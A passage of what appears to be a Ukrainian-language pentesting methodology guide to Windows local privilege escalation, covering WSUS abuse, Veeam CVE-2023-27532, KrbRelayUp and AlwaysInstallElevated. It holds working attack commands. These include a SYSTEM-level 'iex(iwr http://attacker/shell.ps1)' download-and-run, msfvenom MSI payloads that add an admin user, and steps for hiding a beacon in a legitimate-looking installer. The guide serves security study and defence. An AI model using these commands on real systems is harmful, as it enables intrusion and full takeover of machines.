# Ескалація привілеїв локально у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локальної ескалації привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію ескалації привілеїв у Windows із кількох фундаментальних посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практичний процес переліку даних також спирається на воркшопи та контрольні списки спільноти.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичний матеріал про атаки охоплює презентацію DerbyCon про ескалацію привілеїв у Windows.<sup>[[5]](#references)</sup>

## Основи Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, прочитайте цю сторінку, перш ніж продовжити:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs — DACLs/SACLs/ACEs

**Докладніше про ACLs — DACLs/SACLs/ACEs читайте на цій сторінці:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте цю сторінку, перш ніж продовжити:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби захисту Windows

У Windows є різні засоби, які можуть **завадити переліку даних системи**, запуску виконуваних файлів або навіть **виявити вашу діяльність**. Перш ніж почати перераховувати можливості ескалації привілеїв, **прочитайте** цю **сторінку** та **перевірте** всі ці **механізми захисту**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також дає змогу перетворити редагування UEFI NVRAM в автономному режимі на DMA до завантаження системи та ланцюжок патчення пам’яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Захист адміністратора / непомітне підвищення привілеїв UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів, якщо перевірки безпечного шляху AppInfo обійдено. Тут наведено окремий робочий процес обходу UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру доступності Secure Desktop можна використати для довільного запису в реєстр SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з’явився шлях LPE через **SMB на довільному порту**, де привілейована локальна NTLM-автентифікація відображається через повторно використане TCP-з’єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Перелік даних про версію

Перевірте, чи є у версії Windows відомі вразливості (також перевірте встановлені виправлення).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Експлойти для певних версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) стане в пригоді для пошуку докладної інформації про вразливості безпеки Microsoft. Ця база даних містить понад 4 700 вразливостей безпеки, що демонструє **величезну поверхню атаки**, яку створює середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає дані про збірку ОС, встановлені оновлення та відповідні потенційні рекомендації з безпеки; перш ніж вважати результат застосовним, перевірте точний продукт і оновлення, що замінюють попередні.

Для локального експлойта, специфічного для певної версії, перевірте архітектуру **запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows для 32-бітного процесу застосовується [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай відповідає 32-бітному системному каталогу, тоді як `%windir%\Sysnative` надає цьому процесу доступ до нативного системного каталогу. Для 64-бітного процесу цей псевдонім недоступний. Збірка ОС або потенційна відсутність KB не доводить, що систему можна експлуатувати; порівняйте запущену збірку, встановлене оновлення або оновлення, що його замінює, архітектуру процесу й передумови експлойта з [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032), що стосується саме цієї проблеми.

Приклад пошкодження пам’яті служби див. у матеріалі про [зміщення в кільцевому буфері спільної пам’яті MIDI, контрольовані клієнтом](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Опубліковані зміщення стека застосовні лише до протестованої збірки; отримання прав `LOCAL SERVICE` — це окремий етап від подальшого переходу до `SYSTEM` за допомогою [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md).<sup>[[44]](#references)</sup>

**Локально, за наявності системної інформації**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії експлойтів на Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

У змінних середовища збережено облікові дані або будь-яку інформацію, пов’язану з Juicy?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Файли журналу транскрипції PowerShell

Дізнатися, як увімкнути це, можна тут: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрибування PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай зберігає файли в папці Documents кожного користувача, але параметр `OutputDirectory` або `Start-Transcript -OutputDirectory` може перенаправити файли до спільної чи прихованої папки. Перш ніж переглядати transcript, перевірте фактичний шлях збереження та ACL файлу: він може містити аргументи команд і вивід, зокрема облікові дані. Доступний для читання transcript є лише зачіпкою, якщо його вміст розкриває придатну для використання особу з вищими привілеями, а ця особа може ввійти в систему у відповідному контексті.

### Журналювання модулів PowerShell

Записуються подробиці виконання команд у конвеєрі PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повні подробиці виконання та результати виводу можуть не фіксуватися.

Щоб увімкнути цю функцію, дотримуйтеся інструкцій у розділі документації «Файли transcript», вибравши **«Module Logging»** замість **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowersShell, можна виконати:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Фіксується повний перебіг активності та весь вміст виконання скрипту, що гарантує документування кожного блоку коду під час його виконання. Цей процес зберігає повний аудиторський слід кожної дії, цінний для криміналістичного аналізу та дослідження зловмисної поведінки. Документування всіх дій у момент виконання дає змогу отримати детальне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Події журналювання для Script Block можна знайти в Переглядачі подій Windows за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, скористайтеся:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Налаштування Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Диски

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

У попередніх рекомендаціях ризик було підсумовано так:

Ви можете скомпрометувати систему, якщо оновлення запитуються через http, а не http**S**.

Кінцева точка WSUS через HTTP — це привід перевірити можливість перехоплення метаданих оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати або контролювати його трафік, а також від політики довіри до оновлень і їх встановлення на клієнті. Сам URL не є підтвердженням можливості виконання коду. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Спершу перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd таку команду:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або таке в PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримали відповідь на кшталт однієї з таких:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Початкове твердження про застосовність було таким:

Тоді **це можна експлуатувати.** Якщо останнє значення реєстру дорівнює `0`, запис WSUS буде проігноровано.

Коли `UseWUServer` дорівнює `1`, Windows Update використовує налаштовану внутрішню службу. Це підтверджує одну з передумов для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття шкідливого оновлення чи встановлення з підвищеними привілеями можливі. Коли значення дорівнює `0`, ця конкретна кінцева точка WSUS не вибирається цією політикою.

Для експлуатації цих вразливостей можна скористатися такими інструментами: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized MiTM exploit-скрипти для ін’єкції «підроблених» оновлень у незашифрований SSL-трафік WSUS.

Дослідження тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, ця помилка використовує таку ваду:

> Якщо ми можемо змінювати проксі-сервер для нашого локального користувача, а Windows Updates використовує проксі, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), щоб перехопити власний трафік і виконати код із підвищеними привілеями на нашій системі.
>
> Крім того, оскільки служба WSUS використовує параметри поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо згенерувати самопідписаний сертифікат для імені хоста WSUS і додати його до сховища сертифікатів поточного користувача, ми зможемо перехоплювати HTTP- і HTTPS-трафік WSUS. WSUS не використовує механізмів на кшталт HSTS для перевірки сертифіката за принципом trust-on-first-use. Якщо сертифікат, який пред’являється, є довіреним для користувача та містить правильне ім’я хоста, служба його прийме.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (коли його опублікують).

### Оновлення, контрольовані адміністратором WSUS

Окремий шлях існує, якщо поточна ідентичність може **публікувати й схвалювати** оновлення на сервері WSUS. Перевірте ефективне членство в групі `WSUS Administrators` сервера та будь-які делеговані дозволи WSUS, а потім визначте групу комп’ютерів-клієнтів, якій буде призначено схвалене оновлення. [Microsoft вимагає привілеїв адміністратора WSUS для схвалення оновлень](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) і [описує зв’язок довіри для публікації](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, використаному для локально опублікованого вмісту. Перш ніж вважати це шляхом підвищення привілеїв, переконайтеся, що потенційне оновлення підписане й приймається, застосовне до цільової системи та встановлюється в контексті з вищими привілеями. Самого значення HTTP `WUServer` або назви групи недостатньо, щоб підтвердити ці умови.

### Зловживання користувацькими оновленнями SUSDB: непідписані payload-и через `.txt`/`.esd`

Це інше порушення межі довіри, ніж перехоплення HTTP-з’єднання WSUS: необхідною передумовою є доступ до **збережених процедур бази даних WSUS (`SUSDB`)**, достатній для публікації та схвалення користувацького оновлення. Один із практичних шляхів отримання доступу — ретрансляція облікових даних облікового запису комп’ютера WSUS до окремого сервера MSSQL, на якому розміщено `SUSDB`; точні передумови залежать від розгортання, тому спочатку перевірте дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Окремий шлях атаки, у якому автентифікація клієнта WSUS ретранслюється з HTTP/8530 до LDAP, SMB або AD CS, описано в розділі [Зловживання WSUS HTTP для ретрансляції NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Перевірка ретрансляції до зовнішньої бази даних і прав на процедури

У розгортаннях, де WSUS використовує зовнішній SQL Server, спершу перевірте, чи може обліковий запис сервера WSUS автентифікуватися в базі даних і чи досягає ретрансляція NTLM цього прослуховувача. Роль сервера SQL може надавати доступ до процедур публікації оновлень, навіть якщо прямий запис у таблиці заборонено; невдала команда `UPDATE` для `SUSDB` не доводить, що публікацію заблоковано. Перш ніж намагатися опублікувати користувацьке оновлення, перевірте ефективну ідентичність, членство в ролях і дозволи на процедури в авторизованому сеансі SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Визначення процедур, доступні під час виконання, та встановлений файл `SoftwareDistributionPackage.xsd` корисні для відновлення коректних метаданих оновлень. Для батьківського пакета та дочірнього payload потрібні `UpdateIdentity` (тип фрагмента `1`), `LocalizedProperties` (`4`) і `ExtendedProperties` (`2`); зберігайте локальний ID ревізії, повернутий кожним викликом `spImportUpdate`, і узгоджуйте зв’язок пакета, дайджести, розмір, URL вмісту та ревізію. Це процес публікації зі збереженням стану, тому одного успішного виклику збереженої процедури недостатньо, щоб підтвердити виконання на боці клієнта.<sup>[[38]](#references)</sup>

#### Створення, націлювання та схвалення оновлення

У робочому процесі з кастомним оновленням легітимні процедури WSUS використовуються як обмежений API публікації. Важливі переходи станів:<sup>[[38]](#references)</sup>

| Етап | Відповідні збережені процедури |
| --- | --- |
| Імпорт метаданих оновлення | `spImportUpdate` |
| Збереження фрагментів XML із передумовами, локалізованих та розширених | `spSaveXMLFragment` |
| Прив’язка дайджесту вмісту до контрольованого зловмисником URL | `spSetBatchURL` |
| Перелік/створення групи комп’ютерів і додавання клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Схвалення встановлення для цієї групи | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, дайджести, розмір і обробник `CommandLineInstallation` мають узгоджуватися в імпортованих метаданих/фрагментах. Після призначення URL вмісту та цільової групи остаточне схвалення виглядає так; використовуйте нові ідентифікатори оновлення, групи та розгортання, а не повторно використовуйте приклади GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката в значення false, якщо передане ім’я файлу закінчується на `.txt` або `.esd`; `CheckCertificateSignature` пропускається, не перевіривши попередньо, чи є байти текстом або справжнім образом ESD. Тому незмінений PE-файл із назвою, наприклад, `payload.exe.txt` може пройти перевірку вмісту, а згодом бути запущеним обробником встановлення оновлень із командного рядка. Це помилка плутанини типів і політик, а не підроблення підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Стейджинг і автоматизація, сумісні з BITS

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований вміст. Джерело має відповідати вимогам BITS до HTTP: доступного URL недостатньо, оскільки передавання використовує початковий потік `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє помилку синхронізації WSUS `EventId=364` із повідомленням, що BITS потребує заголовка протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, необхідний для ланцюжка імпорту/фрагмента/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається з `BitsWebServer.py` для розміщення вмісту. Мінімальний приклад запуску в авторизованій лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Виконання без нагляду та збереження через повторні спроби

Взаємодія на боці клієнта залежить від політики. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, параметр `4 - Auto download and schedule install`, дає змогу завантажувати й інсталювати схвалене оновлення за налаштованим розкладом без ручного вибору користувачем. Під час тестування payload, оновлення якого залишалося невдалим/незавершеним, повторно пропонувався одразу після завершення процесу callback, тож поведінка повторних спроб може перетворитися на постійне виконання; це помітно, оскільки клієнт показує стан помилки оновлення.<sup>[[39]](#references)</sup>

#### Вектори виявлення та посилення захисту

Корисні вектори перевірки на боці сервера й клієнта в цьому ланцюжку:<sup>[[39]](#references)</sup>

- Перевіряйте виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; досліджуйте нові групи цільових пристроїв, зовнішні джерела вмісту, payload оновлень `.txt`/`.esd` і розгортання, виконані неочікуваними суб’єктами (особливо обліковими записами, що не є комп’ютерними).
- Перевіряйте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте результати перевірки з розширенням payload і сигнатурою вмісту, а не покладайтеся на суфікс.
- Шукайте повторні збої/спроби інсталяції Windows Update, а також виконання PE або неочікувану активність дочірніх процесів/мережі для вмісту з назвами `.txt` чи `.esd`.
- Якщо підтримується, вимагайте Extended Protection for Authentication для служби бази даних і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Мінімізуйте й перевіряйте права `EXECUTE` для процедур користувацьких оновлень.

## Сторонні автооновлювачі та IPC агентів (local privesc)

Багато корпоративних агентів надають локальний IPC-інтерфейс і привілейований канал оновлень. Якщо реєстрацію можна спрямувати на сервер зловмисника, а програма оновлення довіряє шахрайському кореневому центру сертифікації або використовує слабкі перевірки підпису, локальний користувач може доставити шкідливий MSI, який встановить служба SYSTEM. Узагальнений опис техніки (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Оригінальний опис для конкретної версії та примітка з розвідки:

Veeam B&R < `11.0.1.1261` відкриває локальну службу на **TCP/9401**, яка обробляє контрольовані зловмисником повідомлення, що дає змогу виконувати довільні команди від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: перевірте наявність слухача та версію, наприклад за допомогою `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Для Veeam Backup & Replication і Cloud Connect за замовчуванням використовується основна служба резервного копіювання на **TCP/9401**. [Рекомендації Veeam](https://www.veeam.com/kb4424) описують розголошення облікових даних зашифрованої бази даних конфігурації без автентифікації в межах мережевого периметра резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прив’язуватися не лише до localhost, тож перевірте фактичну адресу та PID.

- **Recon**: підтвердьте, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані виправлень. `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` — це підказки, а не повна перевірка наявності виправлень.
- **Мінімальні виправлені версії**: Veeam вказує **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені релізи; попередні релізи вразливі. Самої чотирикомпонентної версії файлу недостатньо, щоб відрізнити невиправлену базову збірку від пізнішого виправлення для тієї самої збірки. Перш ніж вважати граничну збірку виправленою, перевірте ідентифікатор виправлення за [історією збірок постачальника](https://www.veeam.com/kb2680).
- **Exploit**: помістіть PoC на кшталт `VeeamHax.exe` разом із потрібними DLL Veeam в один каталог, а потім активуйте payload SYSTEM через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Служба виконує команду від імені SYSTEM.

У наведеному PoC показано виконання команд від імені SYSTEM, якщо виконуються додаткові передумови; у рекомендаціях постачальника описано проблему розкриття облікових даних.

## KrbRelayUp

Початковий опис середовища зі стандартними налаштуваннями:

У середовищах Windows **домену** за певних умов існує вразливість **локального підвищення привілеїв**. До цих умов належать середовища, де **підписування LDAP не обов’язкове,** користувачі мають власні права, що дають змогу налаштовувати **делегування з обмеженнями на основі ресурсів (RBCD),** а також мають можливість створювати комп’ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **стандартних налаштувань**.

Локальна ретрансляція Kerberos може дати змогу перейти від сеансу входу з нижчими привілеями до привілейованого запису в каталозі, якщо відповідний COM-сервер проходить автентифікацію, а ретрансльований суб’єкт має права на цільовий об’єкт. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) обидва типи запису LDAP — RBCD і `msDS-KeyCredentialLink` (тіньові облікові дані); KrbRelayUp автоматизує деякі з цих сценаріїв. Для ланцюжка RBCD потрібні відповідні права делегування та права на цільовий об’єкт, а для ланцюжка з тіньовими обліковими даними — права на запис ключових облікових даних і KDC, що підтримує шлях автентифікації за сертифікатом. Жоден із цих сценаріїв не випливає лише з членства в домені.

Перевірте фактичні політики контролера домену щодо [підписування LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) і [прив’язування каналу LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL об’єкта для ретрансльованої ідентичності, а також рівні автентифікації й імперсонації вибраного класу COM. Тип входу користувача та контекст облікових даних мають значення: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. На результат також можуть впливати маршрутизація через брандмауер/OXID та встановлені оновлення. Вважайте дозвільну політику або відповідний ACL приводом для перевірки; пасивне перерахування не повинно запускати примусову автентифікацію COM, ретрансляцію автентифікації чи запис до каталогу. Тіньові облікові дані облікового запису комп’ютера можуть дати квиток комп’ютера, а окремий шлях DCSync можливий лише за наявності в цього облікового запису необхідних прав реплікації каталогу.

Знайдіть **exploit у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, див. [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 параметри реєстру **увімкнені** (значення — **0x1**), користувачі з будь-яким рівнем привілеїв можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є meterpreter session, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт створює попередньо скомпільований інсталятор MSI, який пропонує додати користувача/групу (тому вам знадобиться доступ до GIU):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цього інструмента. Зверніть увагу: якщо вам потрібно **лише** **виконати** **команди**, можна створити wrapper для файлу "**.bat**".


{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- За допомогою Cobalt Strike або Metasploit **створіть** **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Назвіть проєкт, наприклад **AlwaysPrivesc**, укажіть `C:\privesc` як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Продовжуйте натискати **Next**, доки не дійдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно створений Beacon payload. Потім натисніть **Finish**.
- Виділіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в розділі **Properties** змініть **TargetPlatform** з **x86** на **x64**.
  - Можна змінити й інші властивості, наприклад **Author** і **Manufacturer**, щоб установлена програма виглядала легітимнішою.
- Клацніть правою кнопкою миші проєкт і виберіть **View > Custom Actions**.
- Клацніть правою кнопкою миші **Install** і виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить запуск beacon payload одразу після запуску інсталятора.
- У розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **зіберіть проєкт**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що платформу встановлено на x64.

### Установлення MSI

Щоб виконати **встановлення** шкідливого файлу `.msi` у **фоновому режимі:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

